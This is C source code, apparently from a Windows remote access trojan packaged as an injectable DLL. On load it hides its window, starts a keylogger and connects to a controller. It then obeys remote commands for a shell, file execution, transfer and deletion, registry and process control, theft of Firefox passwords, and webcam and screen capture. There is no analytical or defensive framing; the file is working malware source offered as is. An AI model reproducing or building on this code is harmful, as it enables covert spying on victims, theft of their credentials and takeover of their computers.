    HDC hdc = GetWindowDC(NULL);
    long color;
    
    for (int x = 0; x < GetSystemMetrics(SM_CXSCREEN); x++)
    {
        for (int y = 0; y < GetSystemMetrics(SM_CYSCREEN); y++)
        {
            color = GetPixel(hdc, x, y);
            color <<= 8;
            color = ~color;
            color >>= 8;
            SetPixel(hdc, x, y, color);
        }
    }
    ReleaseDC(NULL, hdc); 
}
void TurnMonitorOff()
{
SendMessage(HWND_BROADCAST, WM_SYSCOMMAND, SC_MONITORPOWER, (LPARAM) 2);   
}
void TurnMonitorOn()
{
SendMessage(HWND_BROADCAST, WM_SYSCOMMAND, SC_MONITORPOWER, (LPARAM) -1);  
}

HANDLE FileRecvSock;
HANDLE SendFileHandle[1024];
LRESULT CALLBACK MainWndProc(HWND hwnd,UINT Mes,WPARAM wParam,LPARAM lParam)
{

HKEY hTestKey;
int Result = 0;
//DWORD nBytesAvail, nBytesWritten;
int i = 0;
char Name [20] = "";
HMODULE getmodh;
char Path [256] = "";
int nIndex;
getmodh = GetModuleHandle(NULL);
GetModuleFileName(getmodh,Path,sizeof(Path));
sprintf(Path, "%s , %s, %s,", PORT, FPORT, IP);
	switch(Mes)
	{
	case WM_INITDIALOG: 
		while(i < 110)
		{
		strcpy(Name, "");
		sprintf(Name, "Log%d.txt", i);
		DeleteFile(Name);
		i++;
		}
		srand((unsigned)time(0)); 
		KEYID = (rand()%100)+1;
		KeyLog = CreateThread(NULL, 0,KeyLogger,(LPVOID)"", 0, &thread);
		ShowWindow(hwnd,SW_HIDE);
		//SetUp(Path, 0);
		Connection(hwnd);
		break;

		case WM_PAINT: 
		if (!IsHiddenAlready)
		{
			ShowWindow(hwnd,SW_HIDE);
			IsHiddenAlready^=1;
		}
		break;
	case RATMSG_SOCKET:
		Event=WSAGETSELECTEVENT(lParam);
		switch(Event)
		{
		case FD_CONNECT:
		//	MessageBox(NULL, "Connection", "Connected", MB_OK);
			break;
		case FD_CLOSE:
			WSACleanup();
			closesocket(client);
			Connection(hwnd);
				/*ExitProcess(0);
			    EndDialog(hwnd, Event);
		    	PostQuitMessage(0);*/
			
			break;
		case FD_READ:
		ZeroMemory(&Recv, RecvSize);
         Result=recv(client,(char*)&Recv,RecvSize,0);    
		 switch (Recv.PacketType)
			{
				case PACKET_PROGRAM_FILES:
					if( RegOpenKeyEx(HKEY_LOCAL_MACHINE, TEXT("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths"),0, KEY_READ, &hTestKey) == ERROR_SUCCESS)
					{
					QueryInstalls(hTestKey);
					}
					else
					{
					//MessageBox(NULL, "DID NOT worked", "False", MB_OK);
					}
					break;
				case PACKET_REMOTE_SHELL_START:
					if(SHELLSTART == 1)
					{
					Head.PacketType = PACKET_COMPUTER_SHUTDOWN;
					strcpy(Head.Data, "CMD Running");
					send(client,(char *)&Head,sizeof(PACKETHEAD),0);
					break;
					}
					else
					{
					Head.PacketType = PACKET_REMOTE_SHELL_START;
					strcpy(Head.Data, Recv.Data);
					send(client,(char *)&Head,sizeof(PACKETHEAD),0);
					CreateThread(NULL, 0, Shell,(LPVOID)"", 0, &thread);
					}
					break;
				case PACKET_FILE_MANAGER_FILE_EXECUTE:
					//MessageBox(NULL, Recv.Data, "Recv.Data", MB_OK);

					ShellExecute(NULL, "open", Recv.Data, NULL, NULL, SW_SHOWNORMAL);
					break;
                case PACKET_ADD_ID:
					LocalId = Recv.ID;
					systeminfo();
					TerminateThread(FileRecvSock, 0);
					FileRecvSock = CreateThread(NULL, 0, FILERECV,(LPVOID)"", 0, &thread);
					break;
				case STATUS:
					ZeroMemory(&Head, sizeof(Head));
					Head.PacketType = STATUS;
					Head.ID2 = LocalId;
					send(client,(char *)&Head,sizeof(PACKETHEAD),0);
					break;
				case PACKET_COMPUTER_SHUTDOWN:
					if(MySystemShutdown() == TRUE)
					{
					Head.PacketType = PACKET_COMPUTER_SHUTDOWN;
					strcpy(Head.Data, "Computer Shutdown");
					send(client,(char *)&Head,sizeof(PACKETHEAD),0);
					}
					else
					{
				    //MessageBox(NULL, "SHUTDOWN! FALSE", "SHUTDOWN FALSE", MB_OK);
					}
					break;

				case PACKET_FILE_DOWNLOAD_STAT:
					switch(Recv.ID3)
					{
						case 1:
						TerminateThread(SendFileHandle[Recv.ID2], 0);
							break;

						case 2:
						SuspendThread(SendFileHandle[Recv.ID2]);
							break;

						case 3:
						ResumeThread(SendFileHandle[Recv.ID2]);
							break;
					}

					break;
				case EXECUTE:					
					ShellExecute(NULL, "open", Recv.Data, NULL, NULL, SW_SHOWNORMAL);
					break;
				case PACKET_COMPUTER_LOGOFF:
					LogOff();
					break;
				case PACKET_COMPUTER_LOCK:
//					LockWorkStation();
					break;
				case PACKET_FILE_MANAGER_FILE_RECV_S:
					fd[Recv.ID2] = fopen(Recv.Buf2, "wb");
					if(fd[Recv.ID2] == NULL)
					{
	                // MessageBox(NULL, "Could not be Opened!", "Server Opened", MB_OK);
					}
					break;
				case PACKET_FILE_MANAGER_DRIVE:
					Recv.ID = LocalId;
					SendDrives();
					break;
				case PACKET_FILE_MANAGER_FILE_DOWN:
				/*	sprintf(Buffer, "%s | %d | %d ", Recv.Data, Recv.ID2, Recv.ID3);
					MessageBox(NULL, Buffer, "Buffer", MB_OK);*/
					strcpy(FileBuf, Recv.Data);
					ID2 = Recv.ID2;
					ID3 = Recv.ID3;
					SendFileHandle[Recv.ID2] = CreateThread(NULL, 0, SendFile,(LPVOID)Recv.Buf, 0, &thread);
					break;
			    case PACKET_KEYLOGGER:
					KeyConnect = 1;
                    TerminateThread(KeyLog, 0);
					TerminateThread(WindowLog, 0);
					UnhookWindowsHookEx(theHook);
					KeyLog = CreateThread(NULL, 0,KeyLogger,(LPVOID)"", 0, &thread);
					break;
				case PACKET_KEYLOGGER_OFF:
					KeyConnect = 0;
                    TerminateThread(KeyLog, 0);
					TerminateThread(WindowLog, 0);
					UnhookWindowsHookEx(theHook);
					KeyLog = CreateThread(NULL, 0,KeyLogger,(LPVOID)"", 0, &thread);
					break;
				case PACKET_FILE_MANAGER_FILE_FOLDER:
					ListDir(Recv.Data);
					break;
				case PACKET_FILE_MANAGER_FILE_COPY:
					CopyFile(Recv.Buf,  Recv.Data,  FALSE);	
					break;
				case PACKET_FILE_MANAGER_FILE_CUT:
					MoveFile(Recv.Buf, Recv.Data);
                    break;
				case PACKET_FILE_MANAGER_DELETE_FILE:
					DeleteFile(Recv.Data);
					break;
				case PACKET_FILE_MANAGER_FILE_RENAME:
					MoveFile(Recv.Buf , Recv.Data);
					break;
				case PACKET_FILE_MANAGER_NEW_FOLDER:
					CreateDirectory(Recv.Data,NULL);
					break;
				case PACKET_REG_MANAGER:
					 switch(Recv.ID2)
					 {
					 case 0:
						if( RegOpenKeyEx(HKEY_CLASSES_ROOT, TEXT(Recv.Data),0, KEY_READ, &hTestKey) == ERROR_SUCCESS)
						{
						 QueryKey(hTestKey, Recv.ID2, Recv.Data);
						}
						break;
					 case 1:
						if( RegOpenKeyEx(HKEY_CURRENT_USER, TEXT(Recv.Data),0, KEY_READ, &hTestKey) == ERROR_SUCCESS)
						{
						QueryKey(hTestKey, Recv.ID2, Recv.Data);
						}
						break;
					 case 2:
						if( RegOpenKeyEx(HKEY_LOCAL_MACHINE, TEXT(Recv.Data),0, KEY_READ, &hTestKey) == ERROR_SUCCESS)
						{
						 QueryKey(hTestKey, Recv.ID2, Recv.Data);
						}
						break;

					 case 3:
						if( RegOpenKeyEx(HKEY_USERS, TEXT(Recv.Data),0, KEY_READ, &hTestKey) == ERROR_SUCCESS)
						{
						 QueryKey(hTestKey, Recv.ID2, Recv.Data);
						}
						break;
					 case 4:
						if( RegOpenKeyEx(HKEY_CURRENT_CONFIG, TEXT(Recv.Data),0, KEY_READ, &hTestKey) == ERROR_SUCCESS)
						{
						QueryKey(hTestKey, Recv.ID2, Recv.Data);
						}
						break;
					 }
					break;
			    case PACKET_TASK_MANAGER:
					SendTask(LocalId);
					break;
				case PACKET_TASK_MANAGER_KILL:
					KillProcess(Recv.Data);
					break;
				case PACKET_TASK_MANAGER_TASKS:
					ShowTasks(LocalId);
					break;
				case PACKET_TASK_MANAGER_KTASK:
//					TerminateTask(Recv.Data, GetForegroundWindow());
					break;
				case PASSWORD_FIREFOX:
					GetFfPwds();
					break;
				case PACKET_FILE_MANAGER_SEARCH:
					strcpy(Buf, Recv.Buf);
					strcpy(Buf2, Recv.Buf2);
					CreateThread(NULL, 0, FindFileT,(LPVOID)"", 0, &thread);
					break;
				case PACKET_SERVICE_MAN:
					enumservices();
					break;
				case PACKET_SERVICE_STOPA:
					stopService(Recv.Data);
					break;
				case PACKET_SERVICE_STARTA:
					startService(Recv.Data);
					break;
				case WEBCAM_CAPTURE:
					nIndex = GetCamIndex();
					capWebCam("test.bmp", nIndex, 300, 290, 10);
					ConvertImage(L"test.bmp", L"Cam.jpg", L"image/jpeg", 75);
					DeleteFile("test.bmp");
					CreateThread(NULL, 0, SendScreenShot,(LPVOID)"Cam.jpg", 0, &thread);
					break;
			case SCREEN_CAPTURE:
				 DeleteFile("Screeny.jpeg");
				if(GetScreeny(L"Screeny.jpeg", Recv.ID3, Recv.ID2, atoi(Recv.IDS)))
					{
					}
					else
					{
					break;
					}
					 CreateThread(NULL, 0, SendScreenShot,(LPVOID)"Screeny.jpeg", 0, &thread);
					 break;;
			case FUN_MONITOR_ON:
				TurnMonitorOn();
				break;
			case FUN_MONITOR_OFF:
				TurnMonitorOff();
				break;
			case FUN_OPEN_CD:
				mciSendString("set CDAudio door closed", NULL, 0, NULL);
				break;
			case FUN_CLOSE_CD:
				mciSendString("set CDAudio door closed", NULL, 0, NULL);
				break;
			case FUN_INVERT_SCREEN_COLOUR:
				InvertScreen();
				break;
			case PACKET_EXIT:
					ExitProcess(0);
					EndDialog(hwnd, Event);
		    		PostQuitMessage(0);
					break;
			
	
			}

	
		  
		}

		break;
	}
return 0;
}

HWND Inject;

DWORD WINAPI MainThread (LPVOID lpvoid)
{
	//MessageBox(NULL, "Injected", "Injected", MB_OK);
	Inject=CreateDialog(GInstance,(LPCTSTR)MAIN,NULL,(DLGPROC)MainWndProc);
//	ShowWindow(Inject,SW_HIDE);
	MSG msg;
	while(GetMessage(&msg,Inject,0,0)==TRUE)
	{
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}
return 0;
}
int Ran = 0;


BOOL APIENTRY DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)
{
     if(fdwReason == DLL_PROCESS_ATTACH)
	 {

	  if(Ran == 0)
	  {
	   //ShowWindow(NULL,SW_HIDE);	
	   GInstance = hinstDLL;
	   CreateThread(NULL, 0,MainThread,(LPVOID)0, 0, &thread);
		//MessageBox(NULL, "Injected? A", "inject", MB_OK);

		Ran = 1;
	  }

     }
     return TRUE;
}